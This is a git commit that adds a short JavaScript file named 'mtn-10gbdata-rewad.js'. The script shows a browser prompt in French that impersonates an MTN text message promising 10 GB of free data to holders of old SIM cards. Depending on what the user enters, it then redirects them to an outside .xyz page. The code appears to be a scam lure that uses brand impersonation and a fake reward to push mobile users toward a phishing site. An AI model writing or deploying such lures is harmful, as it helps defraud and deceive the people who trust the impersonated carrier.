bf19cdcc620043b1fd88ec564e75c092263ce117
okpoz <okpoitidz@gmail.com>
2026-07-10 07:07:34 +0100

    Create mtn-10gbdata-rewad.js

---
+++ mtn-10gbdata-rewad.js
@@ -0,0 +1,5 @@
+var password = '10 Go de données gratuites'
+password=prompt('MTN SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites. Abonnés disposant d'une ancienne carte SIM, veuillez appuyer sur OK pour activer l'offre.. ','10 Go de données gratuites');
+if (password != '10 Go de données gratuites') {
+location.href='https://okpoitid.xyz/mtn-10gbdata-rewad.html';
+}
